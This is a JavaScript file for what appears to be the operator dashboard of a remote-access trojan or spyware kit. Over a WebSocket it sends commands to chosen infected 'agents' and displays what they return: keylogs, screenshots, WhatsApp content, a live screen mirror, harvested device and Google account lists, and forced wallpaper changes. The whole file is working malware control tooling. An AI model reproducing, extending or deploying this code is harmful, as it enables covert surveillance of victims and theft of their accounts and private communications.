function applyFilter() {
    const container = DOM.whatsappContent;
    if (!container) return;
    
    const items = container.querySelectorAll('[data-platform]');
    
    items.forEach(item => {
        const platform = item.dataset.platform || 'other';
        if (currentFilter === 'all' || platform === currentFilter) {
            item.style.display = 'flex';
        } else {
            item.style.display = 'none';
        }
    });
}

// ==================== COMMAND FUNCTIONS ====================

function sendCommand(command, params = '') {
    if (!selectedAgent) {
        addOutputLine('⚠️ Please select an agent first', 'error');
        return;
    }

    if (!ws || ws.readyState !== WebSocket.OPEN) {
        addOutputLine('⚠️ Not connected to server', 'error');
        return;
    }

    const fullCommand = params ? `${command} ${params}` : command;
    addOutputLine(`📤 Sending: ${fullCommand} to ${selectedAgent}`, 'info');

    ws.send(JSON.stringify({
        action: 'send_command',
        agent_id: selectedAgent,
        command: command,
        params: params
    }));
}

// ==================== OUTPUT FUNCTIONS ====================

function addOutputLine(text, type = 'info') {
    const container = DOM.outputContent;
    const div = document.createElement('div');
    div.className = 'output-line';
    
    const timestamp = new Date().toLocaleTimeString();
    const typeClass = type === 'error' ? 'error' : type === 'success' ? 'success' : '';

    div.innerHTML = `
        <span class="timestamp">[${timestamp}]</span>
        <span class="${typeClass}">${escapeHtml(text)}</span>
    `;
    
    container.appendChild(div);
    container.scrollTop = container.scrollHeight;
    
    while (container.children.length > 500) {
        container.removeChild(container.firstChild);
    }
}

function formatResult(result) {
    if (typeof result === 'string') {
        return result;
    }
    if (typeof result === 'object') {
        try {
            return JSON.stringify(result, null, 2);
        } catch (e) {
            return String(result);
        }
    }
    return String(result);
}

function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

// ==================== FORMAT FUNCTIONS ====================

function formatSize(bytes) {
    if (!bytes) return '0 B';
    const units = ['B', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(1024));
    return `${(bytes / Math.pow(1024, i)).toFixed(1)} ${units[i]}`;
}

function formatTime(timestamp) {
    if (!timestamp) return 'Never';
    try {
        const date = new Date(timestamp);
        const now = new Date();
        const diff = Math.floor((now - date) / 1000);
        
        if (diff < 60) return `${diff}s ago`;
        if (diff < 3600) return `${Math.floor(diff / 60)}m ago`;
        if (diff < 86400) return `${Math.floor(diff / 3600)}h ago`;
        return date.toLocaleString();
    } catch (e) {
        return timestamp;
    }
}

// ==================== EVENT LISTENERS ====================

function setupEventListeners() {
    DOM.commandInput.addEventListener('keydown', (e) => {
        if (e.key === 'Enter') {
            sendCommandFromInput();
        }
    });

    DOM.sendBtn.addEventListener('click', sendCommandFromInput);

    DOM.refreshBtn.addEventListener('click', () => {
        if (ws && ws.readyState === WebSocket.OPEN) {
            ws.send(JSON.stringify({ action: 'get_agents' }));
        }
    });

    DOM.clearBtn.addEventListener('click', () => {
        DOM.outputContent.innerHTML = '';
        DOM.screenshotContent.innerHTML = '';
        DOM.keylogContent.innerHTML = '';
        DOM.whatsappContent.innerHTML = '';
        if (DOM.wallpaperContent) {
            DOM.wallpaperContent.innerHTML = `
                <div class="info">🖼️ Wallpaper History</div>
                <div class="info" style="font-size:12px;color:#6b7a8a;margin-top:8px;">
                    Send <code style="background:#1a2633;padding:2px 8px;border-radius:4px;color:#ff6b6b;">SET_WALLPAPER &lt;URL&gt;</code> to change wallpaper
                </div>
            `;
        }
        resetLiveMirror();
    });

    // Wallpaper section show/hide
    document.querySelectorAll('.command-presets button').forEach(btn => {
        btn.addEventListener('click', function() {
            const cmd = this.dataset.cmd;
            
            if (cmd === 'SET_WALLPAPER') {
                const section = document.getElementById('wallpaper-section');
                if (section) {
                    section.style.display = 'block';
                    document.getElementById('wallpaper-url').focus();
                }
            } else {
                const section = document.getElementById('wallpaper-section');
                if (section) {
                    section.style.display = 'none';
                }
            }
        });
    });

    // Set Wallpaper button
    const setWallpaperBtn = document.getElementById('set-wallpaper-btn');
    if (setWallpaperBtn) {
        setWallpaperBtn.addEventListener('click', function() {
            const url = document.getElementById('wallpaper-url').value.trim();
            if (!url) {
                addOutputLine('⚠️ Please enter a wallpaper URL', 'error');
                return;
            }
            if (!selectedAgent) {
                addOutputLine('⚠️ Please select an agent first', 'error');
                return;
            }
            sendCommand('SET_WALLPAPER', url);
            document.getElementById('wallpaper-url').value = '';
            document.getElementById('wallpaper-section').style.display = 'none';
        });
    }

    // Enter key on wallpaper URL
    const wallpaperUrl = document.getElementById('wallpaper-url');
    if (wallpaperUrl) {
        wallpaperUrl.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') {
                document.getElementById('set-wallpaper-btn').click();
            }
        });
    }
}

function sendCommandFromInput() {
    const input = DOM.commandInput.value.trim();
    if (!input) return;

    const parts = input.split(' ');
    const command = parts[0];
    const params = parts.slice(1).join(' ');

    sendCommand(command, params);
    DOM.commandInput.value = '';
}

function setupCommandPresets() {
    document.querySelectorAll('.command-presets button').forEach(btn => {
        btn.addEventListener('click', function() {
            const cmd = this.dataset.cmd;
            
            if (cmd === 'SET_WALLPAPER') {
                const section = document.getElementById('wallpaper-section');
                if (section) {
                    section.style.display = 'block';
                    document.getElementById('wallpaper-url').focus();
                }
                return;
            }
            
            if (cmd === 'SCREEN_START') {
                switchToTab('livemirror');
                const container = DOM.livemirrorContent;
                if (container) {
                    container.innerHTML = `
                        <div style="text-align:center;padding:40px;color:#00d2ff;">
                            <div style="font-size:48px;">🔄</div>
                            <div style="font-size:16px;margin-top:10px;">Starting screen mirror...</div>
                            <div style="font-size:12px;color:#6b7a8a;margin-top:5px;">Please grant permission if prompted</div>
                        </div>
                    `;
                }
            }
            
            DOM.commandInput.value = cmd;
            sendCommandFromInput();
        });
    });
}

function setupTabs() {
    document.querySelectorAll('.tab').forEach(tab => {
        tab.addEventListener('click', function() {
            document.querySelectorAll('.tab').forEach(t => {
                t.classList.remove('active');
                t.style.color = '#6b7a8a';
                t.style.background = 'none';
            });
            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
            
            this.classList.add('active');
            this.style.color = '#00d2ff';
            this.style.background = '#1a2633';
            
            const tabId = this.dataset.tab;
            const targetTab = document.getElementById(`${tabId}-tab`);
            if (targetTab) {
                targetTab.classList.add('active');
            }
        });
    });
}

// ==================== ACCOUNTS HANDLERS ====================

function handleAccountsData(data) {
    const container = document.getElementById('accounts-content');
    if (!container) return;

    const agentId = data.agent_id;
    const result = data.data;

    if (container.querySelector('.info')) {
        container.innerHTML = '';
    }

    const header = document.createElement('div');
    header.className = 'accounts-stats';
    header.style.cssText = `
        display: flex;
        gap: 16px;
        padding: 8px 0 16px 0;
        border-bottom: 1px solid #1a2633;
        margin-bottom: 12px;
        color: #6b7a8a;
        font-size: 12px;
        flex-wrap: wrap;
    `;
    
    let accounts = result.data || [];
    let count = result.count || accounts.length || 0;
    
    header.innerHTML = `
        <span>👤 Agent: <strong style="color:#c8d6e5;">${agentId.substring(0, 12)}...</strong></span>
        <span>📊 Total Accounts: <span style="color:#ffd93d;font-weight:bold;">${count}</span></span>
        <span>🕐 ${new Date().toLocaleTimeString()}</span>
    `;
    container.appendChild(header);

    if (accounts.length === 0) {
        const empty = document.createElement('div');
        empty.className = 'info';
        empty.textContent = 'No accounts found on this device';
        empty.style.cssText = 'padding:20px;text-align:center;color:#6b7a8a;';
        container.appendChild(empty);
        return;
    }

    accounts.forEach(account => {
        container.appendChild(createAccountItem(account));
    });

    switchToTab('accounts');
    addOutputLine(`👤 Accounts received from ${agentId}: ${count} accounts`, 'info');
}

function handleGoogleAccountsData(data) {
    const container = document.getElementById('accounts-content');
    if (!container) return;

    const agentId = data.agent_id;
    const result = data.data;

    if (container.querySelector('.info')) {
        container.innerHTML = '';
    }

    const header = document.createElement('div');
    header.className = 'accounts-stats';
    header.style.cssText = `
        display: flex;
        gap: 16px;
        padding: 8px 0 16px 0;
        border-bottom: 1px solid #1a2633;
        margin-bottom: 12px;
        color: #6b7a8a;
        font-size: 12px;
        flex-wrap: wrap;
    `;
    
    let accounts = result.data || [];
    let count = result.count || accounts.length || 0;
    
    header.innerHTML = `
        <span>🔵 Agent: <strong style="color:#c8d6e5;">${agentId.substring(0, 12)}...</strong></span>
        <span>📊 Google Accounts: <span style="color:#4285F4;font-weight:bold;">${count}</span></span>
        <span>🕐 ${new Date().toLocaleTimeString()}</span>
    `;
    container.appendChild(header);

    if (accounts.length === 0) {
        const empty = document.createElement('div');
        empty.className = 'info';
        empty.textContent = 'No Google accounts found on this device';
        empty.style.cssText = 'padding:20px;text-align:center;color:#6b7a8a;';
        container.appendChild(empty);
        return;
    }

    accounts.forEach(account => {
        account._isGoogle = true;
        container.appendChild(createAccountItem(account));
    });

    switchToTab('accounts');
    addOutputLine(`🔵 Google accounts received from ${agentId}: ${count} accounts`, 'info');
}

function createAccountItem(account) {
    const div = document.createElement('div');
    div.className = 'account-item';
    div.style.cssText = `
        background: #0d1520;
        border: 1px solid #1a2633;
        border-radius: 8px;
        padding: 12px 16px;
        margin-bottom: 8px;
        display: flex;
        align-items: center;
        gap: 12px;
        transition: background 0.2s;
    `;
    
    div.onmouseover = () => {
        div.style.background = '#15202b';
    };
    div.onmouseout = () => {
        div.style.background = '#0d1520';
    };

    const icon = document.createElement('div');
    icon.style.cssText = `
        font-size: 24px;
        width: 40px;
        height: 40px;
        display: flex;
        align-items: center;
        justify-content: center;
        background: #1a2633;
        border-radius: 50%;
        flex-shrink: 0;
    `;
    
    const isGoogle = account._isGoogle || 
                     (account.type && account.type.includes('google')) ||
                     (account.type_description && account.type_description.includes('Google'));
    
    icon.textContent = isGoogle ? '🔵' : '👤';

    const info = document.createElement('div');
    info.style.cssText = `
        flex: 1;
        min-width: 0;
    `;

    const name = document.createElement('div');
    name.style.cssText = `
        color: #c8d6e5;
        font-weight: 500;
        font-size: 14px;
    `;
    name.textContent = account.name || account.email || 'Unknown Account';

    const email = document.createElement('div');
    email.style.cssText = `
        color: #6b7a8a;
        font-size: 12px;
        word-break: break-all;
    `;
    email.textContent = account.email || '';

    info.appendChild(name);
    if (email.textContent) {
        info.appendChild(email);
    }

    const badge = document.createElement('span');
    badge.style.cssText = `
        font-size: 10px;
        padding: 2px 10px;
        border-radius: 10px;
        font-weight: bold;
        flex-shrink: 0;
        margin-left: auto;
    `;
    
    if (isGoogle) {
        badge.style.background = '#4285F4';
        badge.style.color = 'white';
        badge.textContent = 'Google';
    } else {
        badge.style.background = '#1a2633';
        badge.style.color = '#ffd93d';
        badge.textContent = account.type_description || account.type || 'Account';
    }

    div.appendChild(icon);
    div.appendChild(info);
    div.appendChild(badge);

    return div;
}

// ==================== SWITCH TAB FUNCTION ====================

function switchToTab(tabId) {
    document.querySelectorAll('.tab').forEach(t => {
        t.classList.remove('active');
        t.style.color = '#6b7a8a';
        t.style.background = 'none';
    });
    document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
    
    const targetTab = document.querySelector(`.tab[data-tab="${tabId}"]`);
    const targetContent = document.getElementById(`${tabId}-tab`);
    
    if (targetTab) {
        targetTab.classList.add('active');
        targetTab.style.color = '#00d2ff';
        targetTab.style.background = '#1a2633';
    }
    if (targetContent) {
        targetContent.classList.add('active');
    }
}
